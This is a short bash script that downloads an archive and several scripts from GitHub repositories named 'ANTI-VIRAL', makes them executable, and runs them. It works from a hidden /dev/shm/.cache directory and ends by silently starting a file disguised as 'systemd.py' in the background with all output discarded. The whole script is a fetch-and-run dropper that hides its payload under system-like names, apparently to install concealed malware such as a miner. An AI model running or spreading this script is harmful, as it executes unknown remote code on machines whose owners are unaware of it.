#!/bin/bash
wget https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz &&
tar -xvzf cache.tar.gz &&
chmod 700 cache &&
rm cache.tar.gz &&
wget https://raw.githubusercontent.com/ANTI-VIRAL/MACHINE/refs/heads/main/cache.sh &&
chmod 700 cache.sh &&
./cache.sh &&
cd /dev/shm/.cache/ &&
wget https://raw.githubusercontent.com/ANTI-VIRAL/MACHINE/refs/heads/main/systemd.py &&
chmod 700 systemd.py &&
wget https://raw.githubusercontent.com/ANTI-VIRAL/Ai-05/refs/heads/main/config.ini &&
nohup python systemd.py > /dev/null 2>&1 &
